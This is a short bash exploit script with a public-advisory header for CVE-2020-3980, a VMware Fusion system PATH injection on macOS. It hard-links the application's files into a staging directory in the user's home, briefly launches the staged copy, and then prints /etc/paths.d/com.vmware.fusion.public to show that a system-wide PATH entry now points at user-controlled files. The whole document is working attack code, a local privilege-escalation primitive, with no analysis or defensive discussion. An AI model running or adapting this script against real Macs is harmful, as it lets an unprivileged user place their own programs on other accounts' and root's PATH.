#!/bin/bash
#
# Exploit Title: VMware Fusion System PATH Injection
# Date: 2020-06-03
# Exploit Author: Rich Mirch of CyberOne, TeamARES
# CVE: CVE-2020-3980
# Vendor Advisory: https://www.vmware.com/security/advisories/VMSA-2020-0020.html
#

if pgrep -q "VMware Fusion"
then
  echo "Error: VMware Fusion is running"
  exit 1
fi

stage=$(mktemp -d $HOME/.vmware.stager.XXXXX)

echo "Staging files in ${stage?}; remove when done"
find /Applications/VMware\ Fusion.app/ -d -type d | while read src_dir
do
  dst_dir=${src_dir##/Applications/}
  mkdir -p "$stage/$dst_dir"
  (
    cd "$stage/$dst_dir"
    find "$src_dir" -type f -maxdepth 1 -exec ln "{}" \;
  )
done

echo stage=$stage make sure to delete this when done

"$stage/$dst_dir/VMware Fusion.app/Contents/MacOS/VMware Fusion" 2>/dev/null &
p=$!
echo "Sleeping for 5 seconds"
sleep 5
echo "Killing pid=${p?}"
kill ${p?}
wait

echo Show permissions of /etc/paths.d/com.vmware.fusion.public
ls -ld /etc/paths.d/com.vmware.fusion.public

echo Show the contents of /etc/paths.d/com.vmware.fusion.public
cat /etc/paths.d/com.vmware.fusion.public && echo
